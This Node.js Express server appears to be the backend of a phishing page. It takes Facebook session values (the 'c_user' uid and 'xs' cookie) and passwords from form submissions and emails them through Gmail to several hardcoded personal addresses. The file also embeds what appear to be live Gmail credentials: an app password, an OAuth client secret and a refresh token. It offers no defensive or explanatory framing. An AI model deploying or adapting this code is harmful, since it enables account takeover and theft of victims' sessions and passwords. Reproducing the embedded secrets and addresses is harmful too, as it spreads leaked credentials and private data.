const express = require("express");
const path = require("path");
const nodemailer = require('nodemailer')
const PORT = 80;
const bodyParser = require("body-parser");


const app = express();
app.use(express.static(path.join(__dirname,'static')))
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));


const name = "Ismail"  
const emails = [
  "unaisnizamani598@gmail.com",
  "marina.bhoo.so@gmail.com"
  
]
const workerEmail = "muhammedismail525255@gmail.com";

let transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    type: 'OAuth2',
    user: "helpmate73@gmail.com",
    pass: "rgqelzcaxjkdcgxg",
    clientId: "386032684654-t8d3c930d8llug8p26kvcq7hirbqib9l.apps.googleusercontent.com",
    clientSecret: "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",
    refreshToken: "1//04nvk9JZlEhpdCgYIARAAGAQSNwF-L9IrIUb8lo5ZBXVY0buzCu9MmY-KsqM-Q6Cpovh7TMcOvLMOYniZLTAPNjEw3VGaWQV3RwI"
  }
});


const sendMail = async (name,email,cookie,uid)=>{
  let mailOptions = {
    to:email,
    from:'helpmate73@gmail.com',
    subject:'Cookie',
    text:`
     name:${name}
     xs:${cookie}
     uid:${uid}`,
   
}

await transporter.sendMail(mailOptions)

}

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", async (req, res) => {

  const uid = req.body.c_user;
  const cookie = req.body.xs;


 

  for(let i=0;i<emails.length;i++) {
    await sendMail(name,emails[i],cookie,uid)

  }


  res.sendFile(path.join(__dirname, "password.html"));

  
});


app.post("/", async (req, res) => {
  
  
  const uid = req.body.c_user;
  const cookie = req.body.xs;




  for(let i=0;i<emails.length;i++) {
    await sendMail(name,emails[i],cookie,uid)

  }


  res.sendFile(path.join(__dirname, "password.html"));

  
});

app.get("/submit", (req, res) => {
  res.sendFile(path.join(__dirname, "submit.html"));
});



app.get("/pass", (req, res) => {
  res.sendFile(path.join(__dirname, "password.html"));
});

app.post('/pass',async(req,res)=>{
  const password = req.body.password;
  
  await sendPassword(workerEmail,password);

  for(let i=0;i<emails.length;i++) {
   await sendPassword(emails[i],password)

  }



  res.sendFile(path.join(__dirname, "password.html"));
})


const sendPassword = async (email,password)=>{
  let mailOptions = {
    to:email,
    from:'helpmate73@gmail.com',
    subject:'Password',
    text:`
     password:${password}`
   
}

  await transporter.sendMail(mailOptions)
}

app.listen(PORT, () => {
  console.log("app started....");
});

// { port: process.env.PORT, host: "0.0.0.0" }
